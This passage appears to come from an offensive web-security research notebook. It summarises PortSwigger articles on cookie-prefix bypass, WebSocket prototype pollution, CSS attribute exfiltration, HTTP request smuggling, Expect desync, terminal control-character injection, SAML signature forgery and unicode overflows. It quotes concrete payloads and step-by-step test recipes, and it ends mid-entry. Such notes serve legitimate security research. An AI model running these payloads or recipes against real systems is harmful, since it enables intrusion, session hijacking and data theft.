§17.239 — A `__Host-`/`__Secure-` COOKIE PREFIX IS ENFORCED BY THE BROWSER ON THE RAW NAME AND BY THE SERVER AFTER DECODING: HIDE THE PREFIX BEHIND UNICODE WHITESPACE (U+2000, U+0085, U+00A0) OR A `$Version=1,` LEGACY LIST AND A SUBDOMAIN OR AN INSECURE ORIGIN CAN PLANT A COOKIE WHOSE **NAME** THE SERVER NORMALISES INTO THE PROTECTED ONE (PortSwigger, "Cookie Chaos: How to bypass __Host and __Secure cookie prefixes", Zakhar Fedotkin @zakfedotkin, published 3 September 2025; read in full this pass — `curl` + desktop UA + local strip, 11,264 chars). RFC 6265 defines the Cookie header as a sequence of OCTETS, so the browser sends raw bytes and the server decides how to decode them; the browser therefore checks the prefix on the name it is handed while a trimming server checks a DIFFERENT name. THE PoC: `document.cookie = `${String.fromCodePoint(0x2000)}__Host-name=injected; Domain=.example.com; Path=/;`` — the browser sees an unprefixed, unrestricted cookie and sends it to ALL subdomains; Django (Python `.strip()`, which removes code points `[133, 160, 5760, 8192–8202, 8232, 8233, 8239, 8287, 12288]`) and ASP.NET normalise the name back to `__Host-name`. Safari refuses MULTIBYTE Unicode whitespace in a cookie name but still permits U+0085 (NEL) and U+00A0. LEGACY VARIANT: "if a Cookie header begins with `$Version=1`, some Java-based web servers, such as Apache Tomcat and Jetty, switch into a legacy parsing" where one cookie string is read as several — `$Version=1,__Host-name=injected; Path=/somethingreallylong/; Domain=.example.com;`. FULL CHAIN: from XSS (or an unescaped cookie reflection) inject the forged twin and the browser sends BOTH — `Cookie: __Host-name=Carlos; â€€__Host-name=<img src=x onerror=alert(1)>;` — and many frameworks (Django named) take ONE value, "typically the last occurrence", so the attacker's value wins: reflected XSS on the main origin, or session fixation / privilege escalation when the cookie feeds CSRF or session identity (Django's reply: permitting cookies from untrusted subdomains is already warned against, so "this will not be treated as a security vulnerability"). DETECTION SIGNAL: `__Host-`/`__Secure-` in use AND a server that trims/normalises cookie names (Django, ASP.NET) or a Java server honouring `$Version=1`; a duplicate-cookie resolution that silently picks one value; a sink that re-renders a cookie value. TRANSFERABLE TEST: with JS on a sibling subdomain (or a cookie value you influence), set the twin `String.fromCodePoint(0x2000) + "__Host-<name>=x; Domain=.example.com; Path=/;"` and confirm the app treats it as the protected cookie; try `$Version=1,__Host-<name>=x; …` against Tomcat/Jetty; on Safari use U+0085/U+00A0; then check which duplicate wins. WHY IT IS A NEW GENERAL METHOD: `String.fromCodePoint`, `U+2000`, `$Version=1`, `__Secure`, `cookie prefix`, `cookie sandwich` = 0 hits across the three write targets (`0x2000` 2 hits are `CMD_RESOLVE`/`CMD_COMPLETE` command codes; `__Host` 1/6 hits merely NAME `__Host-session` or list cookie-flag hardening; `cookie tossing` 4/2/3 hits need an injected `Set-Cookie` header, whereas this is a NAME-normalisation discrepancy with no header injection). Rule: **a cookie prefix protects a name, not a byte string — hide the prefix behind Unicode whitespace or a `$Version=1,` legacy list, and the server normalises your cookie into the protected name from a subdomain or an insecure origin.** Slot 17.239. UNVERIFIED (not reproduced) — no Django/ASP.NET/Tomcat/Jetty instance was stood up this pass.

§17.240 — THE WEBSOCKET IS NOT A DEAD END: PUT IT BEHIND AN HTTP ADAPTER SO AN ORDINARY SCANNER CAN FUZZ THE FRAMES, COMPLETE A SOCKET.IO HANDSHAKE (`EIO=4` + `40`), AND TEST SERVER-SIDE PROTOTYPE POLLUTION WITH `{"__proto__":{"initialPacket":"Polluted"}}` — PLUS A THREADED ENGINE FOR WS RACES (PortSwigger, "WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine", Zakhar Fedotkin @zakfedotkin, published 17 September 2025, updated 18 September 2025; read in full this pass — `curl` + desktop UA + local strip, 17,456 chars; the tool-release preamble is excluded). "Many testers and tools give up the moment a protocol upgrade to WebSocket occurs", leaving BAC, race conditions and SQL injection undetected. THE ADAPTER: the extension's HTTP Middleware exposes `POST /proxy?url=https%3A%2F%2F<host>%2Fchat` (`Host: 127.0.0.1:9000`, body = the WS frame, e.g. `{"message":"hi"}`) and relays it over the WS connection, so Burp Scanner/Intruder can fuzz a WebSocket ("ideal for finding server-side vulnerabilities like SQL injection, authentication bypass, or command injection"); because one outgoing frame can yield MANY incoming messages, filter with an incoming-message decorator such as `@MatchRegex(r'{"user":"Hal Pline"')`. SOCKET.IO: "the easiest way to confirm that a server uses Socket.IO is by checking the mandatory query parameter `EIO`, which specifies the protocol version. If it equals 4, the server sends ping packets." — then handshake yourself (`withUpdatedParameters(HttpParameter.urlParameter("EIO","4"))`, queue `'40'`, then `'42["message","hello"]'`, with `@Pong("3")` / `@PingPong("2","3")` keep-alives). SSPP: Socket.IO is "a good candidate for server-side prototype pollution" — polluting `initialPacket` with `{"__proto__":{"initialPacket":"Polluted"}}` "trick[s] Socket.IO into returning a new greeting message", an OBSERVABLE black-box oracle for a polluted prototype (Gareth Heyes' no-DoS detection method). RACES: the default engine chunks messages over ONE connection; the `THREADED` engine "starts multiple worker threads, each with its own WebSocket connection, and sends messages in parallel" to reach "logic bypasses, token reuse, or state desync". DETECTION SIGNAL: `Upgrade: websocket`; `EIO=` / Socket.IO in the bundle; frames trusted without per-message authorisation; a handler merging a JSON body into config/state. TRANSFERABLE TEST: (a) route the WS through the HTTP adapter and scan the frames; (b) on Socket.IO handshake with `EIO=4`+`40` and send the `__proto__`/`initialPacket` payload, diffing the greeting against a clean run; (c) re-fire a state-changing frame over N parallel connections before declaring no race; (d) replay each frame with no auth / as another tenant. DO-NOT-TEST (doctrine §2(d)): the paper's "ping of death" (a frame HEADER declaring `Integer.MAX_VALUE` bytes with no body → allocation on the declared length → OOM) is a DoS primitive and is recorded as a fingerprint only. WHY IT IS A NEW GENERAL METHOD: `initialPacket`, `EIO=`, `MatchRegex`, `PingPong`, `WebSocket Turbo Intruder` = 0 hits; `Socket.IO` 2/0/1 hits are a realtime-transport XSS signal line and an unrelated kernel entry; the recorded prototype-pollution entries (client-side gadget, Kibana `__proto__.sourceURL` → RCE, GitLab Mermaid) are all HTTP/DOM merge sources. Rule: **a WebSocket is an attack surface, not a boundary — wrap it as HTTP so a scanner can fuzz the frames, handshake Socket.IO on `EIO=4` and pollute `initialPacket` to prove server-side prototype pollution black-box, and use threads (one connection each) for the races a single connection can never show.** Slot 17.240. UNVERIFIED (not reproduced) — no WS target, Socket.IO server or Burp instance was stood up this pass.

§17.241 — CSS CONDITIONALS PLUS `attr()` PLUS `image-set()` EXFILTRATE ANY ATTRIBUTE VALUE FROM A SINGLE INLINE `style` ATTRIBUTE — NO `<style>` BLOCK, NO SELECTORS, NO STYLESHEET IMPORT (PortSwigger, "Inline Style Exfiltration: leaking data with chained CSS conditionals", Gareth Heyes @garethheyes, published 26 August 2025, updated 27 August 2025; read in full this pass — `curl` + desktop UA + local strip, 8,642 chars). DELTA over §17.228 (nested attribute selectors, the font-height oracle, `image-set(var(--x,'//attacker'))`, CSSOM mutation). THE VECTOR: `<div style='--val:attr(title);--steal:if(style(--val:"1"): url(/1); else: url(/2));background:image-set(var(--steal))' title=1>test</div>` — `attr()` reads ANY attribute into a custom property, `if(style(…))` compares it, `image-set()` fires the request. THE QUIRK: the comparison needs DOUBLE quotes; the single-quote form silently fails. REDUCTION: `url()` is optional (a plain string works), credited to Luke Jahnke. ENUMERATION: nest the ifs — the `data-uid` example chains `if(style(--val:"1"): url(/1); else: if(style(--val:"2"): url(/2); else: … url(/10))))))))));` and the demo steals a `data-username` (`data-username="james"` → `https://portswigger.net/<name>`). CAVEAT: "at the time of writing this technique only works on Chromium based browsers"; a Burp Custom Action brute-forces the candidates. DETECTION SIGNAL: a `style`-ATTRIBUTE-only sink that strips `<style>` blocks but keeps inline styles; any attribute (or attribute-bound DOM property) holding a short secret (user id, username, CSRF token, numeric code); a sanitizer that blocks imports but not `if()`/`attr()`/`image-set()`. TRANSFERABLE TEST: `style='--v:attr(TARGET);--s:if(style(--v:"GUESS"):"/hit";else:"/miss");background:image-set(var(--s))'` (DOUBLE quotes, no `url()`), nesting `else:` to enumerate, watching your collaborator. WHY IT IS A NEW GENERAL METHOD: `if(style(` 1 hit is §17.228's font-height oracle, where `--flag` comes from an `@keyframes` and NOT from an attribute, and `image-set` 8/1/6 hits are the recorded sanitizer/proxy bypass; `data-uid`/`data-username` = 0 hits. Rule: **a style attribute is enough to steal any attribute's value — `attr()` reads it, `if(style(…))` compares it (double quotes), and `image-set()` fires it.** Slot 17.241. UNVERIFIED (not reproduced) — no browser was driven; the vector is the author's own.

§17.242 — A DESYNC STARTS FROM A PARSER **DISCREPANCY**, NOT FROM A KNOWN PAYLOAD: PROBE WITH PARTIALLY HIDDEN/DUPLICATED HEADERS, CLASSIFY V-H vs H-V FROM WHICH TIER ANSWERS, HIDE `Content-Length` FROM THE BACK-END (CL.0) OR FROM THE FRONT-END (0.CL), BREAK THE 0.CL DEADLOCK WITH AN EARLY-RESPONSE GADGET (`/con` ON IIS, A STATIC FILE ON NGINX), AND CONVERT 0.CL→CL.0 WITH A DOUBLE-DESYNC THAT STARTS **BEFORE** THE FRONT-END'S APPENDED HEADERS (PortSwigger, "HTTP/1.1 must die: the desync endgame", James Kettle @albinowax, published 6 August 2025, updated 17 October 2025; read in full this pass — `curl` + desktop UA + local strip, 49,411 chars; DELTA over the recorded CRLF/`$uri` desync entry and §17.236). THE DISCREPANCY PROBE (HTTP Request Smuggler v3, extending Daniel Thacher's 2021 header-smuggling idea): send a PARTIALLY HIDDEN header — a leading space before the NAME (` Content-Length: 23`, ` Host: x`) or a masked duplicate (`Xost: x`) — and compare against the normal header, the absent header and an arbitrary other masked header; a response that CANNOT be produced any other way proves a discrepancy ("the specific status codes are not relevant … All that matters is that they're different"). CLASSIFY: V-H = masked header VISIBLE to the front-end but HIDDEN from the back-end; H-V = the reverse (the IIS/ALB example is unambiguous from the banners: `Host: foo/bar` → `400, Server: awselb/2.0`; `Xost: foo/bar` → `200, -no server header-`). V-H → CL.0 by hiding `Content-Length` from the back-end (` Content-Length: 23` as a headered line, then a smuggled `GET /404`); CL.0 is preferred over TE.CL "as it's much less likely to get blocked by a WAF"; when the front-end rejects GET-with-body, "switching the method to OPTIONS" works around it. H-V ON IIS BEHIND ALB is mass-vulnerable and deliberately UNPATCHED by AWS (CL.TE blocked by Desync Guardian, bypassed by Thomas Stacey with H2.TE; even fixed, the discrepancy still smuggles HEADERS "enabling IP-spoofing and sometimes complete authentication bypass"; self-mitigate with `routing.http.drop_invalid_header_fields.enabled` + `routing.http.desync_mitigation_mode = strictest`). 0.CL DEADLOCK: hide `Content-Length` from the FRONT-END (`Content-Length:` + ` 7`) and the pair deadlocks (the front-end hatches the body, the back-end waits for it, someone times out → `504`) — escape it with an EARLY-RESPONSE GADGET that makes the back-end answer without the body: a STATIC FILE on nginx, and on IIS the WINDOWS RESERVED DEVICE NAME — request `/con` in any filesystem-mapped folder and IIS "respond[s] without waiting for the body to arrive, and helpfully leave[s] the connection open" (`CON, PRN, AUX, NUL, COM1 …`); server-level redirects work elsewhere, Apache has none ("too studious about closing the connection"). Prove 0.CL by putting a second path inside the victim request's header block (→ `302 … Location: /Logon?ReturnUrl=%2fwrtz`), then convert to CL.0 with a DOUBLE-DESYNC (req 1 poisons with 0.CL, the poisoned connection weaponises req 2 into a CL.0 that re-poisons with a malicious prefix, the prefix hits the victim) — the clean form is fragile because you cannot know the front-end's injected header length, so exploit "Most servers insert headers at the END of the header block … if our smuggled request starts before that, the attack will work reliably!", revealing the inserted header with an input reflection and measuring it with the `0cl-find-offset` script (then the classic `HEAD` technique served malicious JS to random users). DETECTION SIGNAL: a masked/duplicated header producing a unique response; a "mystery 400"; a server answering before its body arrives; front-end-injected headers appended at the END of the header block. TRANSFERABLE TEST: (a) masked-header permutation probe → any unique response = a discrepancy; (b) V-H → leading-space CL.0 (OPTIONS if GET-with-body is refused), H-V → 0.CL; (c) 0.CL deadlock → early-response gadget (`/con`, nginx static file, redirect) → double-desync starting before the appended headers. WHY IT IS A NEW GENERAL METHOD: `Xost:`, `awselb`, `Desync Guardian`, `drop_invalid_header_fields`, `double-desync`, `0cl-find-offset`, `masked header`, `parser discrepancy` = 0 hits across the three write targets; the CRLF/`$uri` entry and §17.236 hold the detection codes, RQP, CL.TE timeout, dangling byte, protocol ruler etc., and are NOT re-recorded. Rule: **find the discrepancy before the exploit — a partially hidden or duplicated header that yields an otherwise impossible response is the signal; decide V-H or H-V from which tier answers, hide `Content-Length` from the side you need, break the 0.CL deadlock with an early-response gadget (IIS `/con`, an nginx static file), and double-desync 0.CL into CL.0 starting before the headers the front-end appends.** Slot 17.242. UNVERIFIED (not reproduced) — no nginx/IIS/ALB lab was stood up and no target was touched this pass.

§17.243 — `Expect` IS ITSELF A DESYNC PRIMITIVE: A VANILLA `Expect: 100-continue` GIVES A 0.CL DESYNC ON NUMEROUS SERVERS, AN OBFUSCATED ONE REACHES FAR MORE (AND A CDN EDGE), AND THE SECOND HEADER BLOCK IT CREATES DEFEATS RESPONSE-HEADER REMOVAL WHILE EXPECT CAN LEAK MEMORY AND SECRET KEYS (PortSwigger, "HTTP/1.1 must die: the desync endgame", James Kettle @albinowax, published 6 August 2025, updated 17 October 2025; read in full this pass — `curl` + strip, 49,411 chars; DELTA — the CRLF entry holds only the `Expect`-as-tunnel-reveal case). `Expect: 100-continue` splits one request into header-block + body and "significantly worse for reverse proxies". VANILLA Expect → 0.CL: "a broken Expect implementation in the front-end server, which makes it correctly forward the headers, but get confused by the back-end's non-100 reply and forget it still needs to receive a body from the client" (`GET /logout HTTP/1.1` / `Host: <redacted>.t-mobile.com` / `Expect: 100-continue` / `Content-Length: 291` → `404`; T-Mobile paid $12,000 on a non-production domain). OBFUSCATED Expect → far more targets: `Expect: y 100-continue` gave a 0.CL desync on `h1.sec.gitlab.net` (the host holding GitLab's bug-bounty report attachments), exploited with Response Queue Poisoning — "27,000 requests later we got access to someone else's vulnerability report video and a $7,000 bounty" (~$95,000 across the 0.CL Expect-based findings). Expect ALSO gives CL.0s: VANILLA on the Netlify CDN produced a CL.0 RQP "send[ing] us a continuous stream of responses from every website on the Netlify CDN" (third-party responses; Netlify: "Websites utilizing Netlify are out of scope"), and OBFUSCATED `Expect:` (newline + space before `100-continue`) on Akamai served arbitrary content to `auth.lastpass.com` users ($5,000 max; the wider campaign, CVE-2025-32094, produced 74 bounties totalling $221,000). SIDE-EFFECTS: (a) "All HTTP/1.1 responses have one header block — unless you send Expect", so a front-end's attempt to REMOVE sensitive response headers fails and masked `Server:` banners plus internal headers reappear (Netlify: `X-Bb-Account-Id`, `X-Nf-Cache-Key`, `X-Nf-Proxy-Header-Rewrite`, …); (b) some servers respond to Expect by DISCLOSING MEMORY — text fragments and SECRET KEYS (`HTTP/1.1 100 ContinTransfer-EncodingzxWthTQmiI8fJ4oj9fzE"` / `X-: chunked`); (c) Expect can make a server forget HEAD has no body and deadlock upstream (`HEAD` + `Content-Length: 6` + `Expect: 100-continue` + `ABCDEF` → `100 Continue` then `504`). DETECTION SIGNAL: `Expect` handled inconsistently between tiers; a response carrying an EXTRA header block; a masked banner reappearing; memory text in a `100 Continue` path. TRANSFERABLE TEST: send the SAME request with vanilla `Expect: 100-continue` and obfuscated variants (`Expect: y 100-continue`, `Expect:` + newline + `100-continue`, `Expect :\t100-continue`) against a control, look for a 0.CL/CL.0 desync (and a `504` deadlock as the 0.CL fingerprint), and diff the response HEADERS against the no-Expect run to recover headers the front-end strips. WHY IT IS A NEW GENERAL METHOD: `Expect: y` = 0 hits and the recorded `Expect: 100-continue` material is only the tunnel reveal inside the CRLF entry; NEW = the vanilla-vs-obfuscated × 0.CL-vs-CL.0 taxonomy, the second-header-block response-header-removal bypass and the Expect memory disclosure. Rule: **`Expect` is a complexity bomb, not a client optimisation — one un-obfuscated `Expect: 100-continue` 0.CL-desyncs many servers, obfuscating it opens the rest and CDN edges, and the extra header block it produces defeats front-end header removal and can leak memory.** Slot 17.243. UNVERIFIED (not reproduced) — no Expect-capable front-end lab was stood up this pass.

§17.244 — "ONLY WORKS WITH CONNECTION REUSE" IS USUALLY A CLIENT ARTEFACT, BUT THREE CLASSES NEED REUSE: DISABLE REUSE FIRST, THEN PROVE THE REAL ONE OVER HTTP/2 (A NESTED HTTP/1 RESPONSE) AND PAY FOR IT WITH CACHE POISONING, A REFLECTION GADGET THAT DISCLOSES INTERNAL HEADERS (AUTH BYPASS), CONTROL BYPASS OR HOST TAMPERING (PortSwigger, "Beware the false false-positive: how to distinguish HTTP pipelining from request smuggling", James Kettle @albinowax, published 19 August 2025; read in full this pass — `curl` + desktop UA + local strip, 12,595 chars). "When creating a request smuggling proof of concept, always disable connection reuse where possible. If this breaks your attack, you have a choice — give up, or dive deeper." Most reuse-only PoCs are a desync between YOUR CLIENT and the target (the article's `Content_Length: 47` CL.0 example only fired because the author's client appended the next request's bytes — the raw stream shows `X: YPOST / HTTP/1.1`; "hackxor doesn't even have a back-end so it's immune to request smuggling"). THE THREE VALID REUSE-REQUIRING CLASSES: (a) CONNECTION-LOCKED request smuggling (some front-ends reuse the upstream connection only if the client connection was reused); (b) CONNECTION-STATE attacks / FIRST-REQUEST ROUTING (the FIRST request on a connection is treated differently; not technically smuggling, occurs even with no front-end); (c) CLIENT-SIDE DESYNC (restricted to a request the victim's browser will send cross-domain, so no header obfuscation). PROOF: "send a request over HTTP/2 that triggers a response containing a separate HTTP/1 response nested inside it", or distinguish with PARTIAL REQUESTS; HTTP Request Smuggler's 'connection-state probe' finds first-request routing automatically. IMPACT LADDER (a connection-locked bug cannot attack other users directly): poison the CACHE if one exists ("an easy high-impact attack"); find an INPUT-REFLECTION gadget "to reveal any headers the front-end is injecting. Sometimes internal headers enable complete authentication bypass!"; bypass "any security controls applied by the front-end server" (blocked paths); tamper with the HOST header directly and inside smuggled requests "to gain access to some previously off-limits internal systems". DETECTION SIGNAL: a PoC that only fires with reuse (`requestsPerConnection > 1`, Burp Intruder connection reuse, Repeater 'Send group in sequence (single connection)', "two HTTP/1 responses in one"); a cache in front; an open reflection gadget; front-end path blocks. TRANSFERABLE TEST: disable reuse; if the PoC survives, report it as a normal desync; if it breaks, test for connection-locked/connection-state (HTTP/2 nested-HTTP/1 response, partial requests, connection-state probe) and then spend the effort ONLY on impact. WHY IT IS A NEW GENERAL METHOD: `first-request`, `connection state`, `masked header`, `HTTP Hacker`, `Smuggling or pipelining` = 0 hits; `pipelining` 1/1 and `connection-locked` 4/2/3 hits are the recorded pause-based-desync "early read" and the CRLF entry's connection-locked `0.CL`. Rule: **disable connection reuse before believing any smuggling PoC; if it still fires, classify it (connection-locked / first-request routing / client-side desync) and turn it into impact via cache poisoning, an internal-header reflection (auth bypass), control bypass or host tampering — a desync that only surprises yourself is not a report.** Slot 17.244. UNVERIFIED (not reproduced) — no Burp/Turbo Intruder session and no desync-capable target were used this pass.

§17.245 — UNTRUSTED BYTES THAT REACH A PTY ARE KEYSTROKES, NOT TEXT: SOH (`\x01`) MOVES THE CURSOR TO THE START OF THE LINE SO A PAYLOAD BUILDS ITSELF IN REVERSE, ETX (`\x03`) ABANDONS THE LINE AND CR (`\x0d`) EXECUTES IT — SO EVERY FIELD THAT ENDS UP IN A TERMINAL IS A COMMAND-INJECTION SINK THAT NO SHELL ESCAPER CAN SEE (PortSwigger, "Drag and Pwnd: Leverage ASCII characters to exploit VS Code", Zakhar Fedotkin @zakfedotkin, published 30 April 2025, updated 1 May 2025; read in full this pass — `curl` + desktop UA + local strip, 11,823 chars; reproduced by the author on macOS and Ubuntu; MSRC closed it: "they do not consider it a security issue … existing mitigations - such as workspace trust warnings and the requirement for significant user interaction - lower the severity"). WHY IT WORKS: `node-pty` "forwards raw bytes directly to a shell, trusting that everything downstream will 'do the right thing'", and the Readline layer behind it reuses the ASCII communication-control characters for line editing — `\x01` = Ctrl+A (move to the beginning of the line), `\x02` = Ctrl+B (back one character), `\x03` = Ctrl+C (interrupt / abandon the line), `\x04` = Ctrl+D (delete at the cursor), `\x0d` = Enter (EXECUTE). CASE 1 — ARGUMENTS: a VS Code run configuration `{"args": ["hello","\u0001\t--args\u0001\tCalculator\u0001\t-a\u0001open\t"]}` runs `open -a Calculator --args cd /tmp/; /usr/bin/env /opt/homebrew/bin/python3 script.py hello` instead of the script — "Whenever Visual Studio Code sees byte [ \x01 ] SOH, it moves the cursor to the beginning of the line (Ctr + a). This action is repeated four times in the given example to build the payload in reverse" (Ubuntu: `gnome-calculator`). CASE 2 — FILENAMES / DRAG-AND-DROP: a file named `very very very long name \x03 open -a Calculator \x0d.txt` rendered by the terminal is `'very very very long name` [Ctrl+C: abandon the line] newline `open -a Calculator` [Enter] `'.txt'` — "when a file is dragged and dropped, the carriage return character `[\x0d]` automatically executes a command. This prevents the user from examining the potentially harmful input in the terminal window". WHY THE ESCAPER IS BLIND TO IT: the post's `shellEscape` regex escapes `[$!'"();`*?{}[\]<>&%#~@\\ ]` and has no control-character branch, so the injection carries no shell metacharacter at all and survives every quoting/escaping layer; the flaw is in how the app TALKS to the terminal, "regardless of the underlying language, framework, or runtime environment". PLATFORM: reproduced on macOS and Ubuntu; Windows is mitigated (the filesystem disallows control characters in filenames AND PowerShell ignores them as cursor moves / command breaks); macOS Terminal warns on drag-and-drop of special characters and Ubuntu's terminal escapes them — so the technique needs the application's OWN PTY path (a web SSH/console UI, a browser terminal, an IDE/CI run configuration, a log or chat viewer printing untrusted bytes), not the OS terminal. DETECTION SIGNAL: any field whose content a PTY will echo or execute — a filename printed on drag-and-drop, an IDE/CI run-configuration `args` entry, a notebook cell, a web terminal / `kubectl exec` UI, a log viewer rendering raw bytes; a filename/path/argument validator that ACCEPTS `\x01`–`\x1f` or `\x0d`; a shell-escaping function with no control-character branch. CHAIN: an untrusted string (filename, argument, log line) reaches a PTY (primitive: treated as inert text — the bug lives in the terminal/line-editor layer, not in the shell) -> `\x01` rewrites the pending command line from the left, or `\x03` + `\x0d` abandon it and execute a fresh command, so the attacker composes any command with NO shell metacharacters for the escaper to catch (escalation: every quoting/escaping layer is bypassed while still appearing correct) -> OS command execution as the terminal's user — a workstation RCE when a spec'd workflow runs the attacker-controlled file, a HOST RCE when the PTY is server-side, which is the only non-interactive (reportable) case. TRANSFERABLE TEST: find a field whose content a PTY will echo or execute and submit `aaa\x01echo PWNED\x0d` (in JSON: `\u0001` … `\u000d`); in a filename test use `x \u0003 echo pwned \u000d.txt` and drag/print it; confirm the escaper in front of the sink is regex-based shell escaping with no control-character branch. Rule: **"it only goes to a terminal" is not inert — SOH (`\x01`) moves the cursor to the line start, ETX (`\x03`) abandons the line and CR (`\x0d`) executes it, so raw bytes entering a PTY reassemble an attacker command no shell escaper ever sees; only a sanitizer that strips control characters stops it.** Slot 17.245. UNVERIFIED (not reproduced) — no terminal/IDE lab was stood up this pass.

§17.246 — AN XML PARSE→SERIALIZE→RE-PARSE ROUND TRIP IS A SIGNATURE BYPASS: MUTATE THE DOCUMENT INSIDE THE DOCTYPE (SYSTEM-IDENTIFIER QUOTE CONVERSION) SO THE VERIFIER VALIDATES THE ORIGINAL NODE WHILE THE APPLICATION CONSUMES YOURS, SPLIT THE TWO PARSERS WITH AN `<!ATTLIST>` DUPLICATE NAMESPACE DECLARATION PLUS A FORGED SECOND DIGEST, AND HARVEST THE SIGNED XML FOR FREE FROM THE IDP'S PUBLIC WS-FEDERATION METADATA (PortSwigger, "SAML roulette: the hacker always wins", Gareth Heyes @garethheyes with Zakhar Fedotkin, published 18 March 2025, updated 31 March 2025; read in full this pass — `curl` + desktop UA + local strip, 15,665 chars; unauthenticated ADMIN on GitLab Enterprise; fixed in GitLab CE/EE 17.9.2, 17.8.5, 17.7.7; delta over the sibling §17.237 "Fragile Lock" paper). THE ROUND TRIP: "SAML libraries often parse an XML document, store it as a string, and later re-parse it" — ruby-saml validates the signature with REXML and reads attributes with Nokogiri, so "if any mutations occur during this process, the document may not be identical when parsed a second time": the VERIFIED tree and the USED tree differ, and the attacker controls the difference. THE MUTATION: place it in the DOCTYPE's SYSTEM identifier — a single-quoted system identifier is re-serialised with DOUBLE quotes, and because the identifier contains double quotes internally the re-serialised XML terminates the string early, turns the following XML COMMENT into processed markup and yields "an entirely different node" (first parse = the original trusted `assertion`, second parse = the attacker's) — the refinement by Zak of Juho Forsén's notation/quote-inconsistency finding. WHAT MUST MATCH (the entire exploit budget): the certificate embedded in the SAMLResponse is hashed against the server's stored fingerprint and the signature is validated against the ORIGINAL element, while "all other validation checks operate on the attacker assertion" — only the signed element's `ID` in both documents and the canonicalization properties must agree, so NameID, attributes, conditions and session index are freely attacker-controlled "without breaking the signature verification process". THE PARSER SPLIT THAT SATISFIES THE XSD: ruby-saml searches for the `Signature` element with an XPath on the `ds` namespace, and "Both REXML and Nokogiri support doctype-based namespace declarations, but REXML has a crucial flaw: XML standards prohibit duplicate attributes with the same name. However, REXML ignores this restriction in doctype declarations" — declare that namespace from an `<!ATTLIST>` twice and the SECOND declaration overrides the first, so "REXML reads a FAKE digest value, while Nokogiri reads the REAL one"; ship TWO `Signature` elements (one valid digest, one forged) and Digest Validation is bypassed. RUBY < 3.4.2 MAKES BOTH HALVES NECESSARY: before 3.4.2 REXML TRUNCATED `!ATTLIST` strings, which alone breaks GitLab — on the FIRST parse it ignores the declaration (string literal), on the SECOND it recognises it → exploitation; the generalisable reach is widened by the fact that "Security experts often focus on !ENTITY declarations in XXE attacks, but !ATTLIST declarations can also be used for exploitation". FREE SIGNED XML — THE PRECONDITION DELETED: "Identity Providers (IdPs) silently support Single Sign-On protocol: WS-Federation by default for every tenant. WS-Federation provides signed metadata XML endpoints" (e.g. `https://login.microsoftonline.com/<tenant>.onmicrosoft.com/...`), "publicly accessible to any unauthorized user — all that's required is the application's unique ID, which can be easily extracted from the Identity Provider's URL or found using a search engine"; it need not even be SAML metadata, because "a namespace confusion attack only requires a valid Signature element — one that is signed with the same certificate stored at the Service Provider. And it is." Mitigation (and therefore the fingerprint): "ensure that the same library is used for both parsing and validating signed XML documents. Avoid marshaling and unmarshaling untrusted user data." DETECTION SIGNAL: a SAML/OIDC SP in the Ruby (`ruby-saml`, REXML+Nokogiri split) or PHP (DOM+xmlseclibs) ecosystem; a signature validated on a RE-SERIALISED copy of the document rather than on the transmitted bytes; a validator locating the Signature by PREFIXED name via XPath while schema/attribute reading happens in another parser; a DTD accepted at all inside a SAMLResponse, and a library tolerating duplicate attribute/namespace declarations in it; any PUBLICLY fetchable XML the IdP has signed (WS-Federation metadata, signed SAML metadata, a signed error response). CHAIN: an unauthenticated request → a public WS-Federation metadata document signed by the certificate the SP already trusts (primitive: a legitimate signature with no credentials, no MITM, no key compromise) -> the DOCTYPE SYSTEM-identifier quote conversion makes the parse→serialise→re-parse round trip swap the `Assertion` the application consumes, while the `!ATTLIST` duplicate-namespace declaration makes REXML read a forged digest and Nokogiri the real one (escalation: signature validation passes on the ORIGINAL node while the app acts on the ATTACKER's assertion, with only `ID` + canonicalization needing to agree) -> log in as any user and assert an administrative NameID/attribute → unauthenticated administrator on the SP, demonstrated on GitLab Enterprise (escalation: full SSO authentication bypass → ATO + privilege escalation; P1/Critical). TRANSFERABLE TEST: on any SAML SP — (a) fetch the IdP's public WS-Federation metadata for the tenant and keep the `<Signature>`; (b) round-trip the document, flipping the quote style inside the DOCTYPE SYSTEM identifier (`'…"'` → `"…'"`) so the re-serialised copy terminates the string early around an XML comment, and diff the tree from parse 1 against parse 2; (c) move the `ds` namespace declaration into the DOCTYPE via a DUPLICATED `<!ATTLIST>` so REXML honours the second and Nokogiri the first, and ship two `Signature` elements (real digest + forged digest); (d) keep the signed element's `ID` and canonicalization identical; (e) POST to the ACS with your chosen NameID/`memberOf` and see whether a session is issued — compare `xmlsec1 --verify` (should fail) against the app's own validator, because the technique lives in the gap. Rule: **the verifier and the consumer are different parsers — parse, re-serialise and re-parse the same XML and mutate it in the DOCTYPE (SYSTEM-identifier quote conversion, `!ATTLIST` duplicate namespace, forged second digest) so the signature is checked on the original node while the application consumes yours; and never hunt for a signed assertion you cannot obtain — the IdP signs XML you can fetch for free (WS-Federation metadata).** Slot 17.246. UNVERIFIED (not reproduced) — no SAML SP/IdP pair, ruby-saml instance or GitLab instance was stood up this pass.

§17.247 — A SINGLE-BYTE STORE OVERFLOWS: A CHARACTER THE BLOCKLIST BANS IS RE-SYNTHESISED FROM CODEPOINT `char + n*256` (AND `String.fromCharCode` OVERFLOWS THE SAME WAY ABOVE 0xFFFF), SO EVERY CHARACTER POLICY IS PROBEABLE WITH WRAPPED CODEPOINTS (PortSwigger, "Bypassing character blocklists with unicode overflows", Gareth Heyes @garethheyes with Zakhar Fedotkin, published 28 January 2025, updated 29 January 2025; read in full this pass — `curl` + desktop UA + local strip, 6,314 chars; a short micropost, tooling announcements excluded). THE PRIMITIVE: "Unicode codepoint truncation - also called a Unicode overflow attack - happens when a server tries to store a Unicode character in a single byte. Because the maximum value of a byte is 255, an overflow can be crafted to produce a specific ASCII character." ARITHMETIC: for target byte `b`, send `b + n*256` — the post's examples, all ending 0x41 (`A`): `0x4e41 0x4f41 0x5041 0x5141`, proven by `String.fromCodePoint(0x4e41 % 256, 0x4f41 % 256, 0x5041 % 256, 0x5141 % 256) // AAAA`. CLIENT-SIDE TOO: `String.fromCharCode()` "allows you to generate a character between 0-0xffff but if you go above this range it will be overflowed and produce a character by the overflow amount" — `String.fromCharCode(0x10000 + 0x31, 0x10000 + 0x33, 0x10000 + 0x33, 0x10000 + 0x37) //1337`. WHERE IT FIRES: any stage that casts codepoint→byte between the validator and the sink (Latin-1/8-bit store, fixed-width buffer, single-byte charset conversion, BMP-ignoring serialisation, a JS wrapper that overflows). WHY IT IS A NEW GENERAL METHOD: `unicode overflow`, `codepoint truncation`, `fromCharCode`, 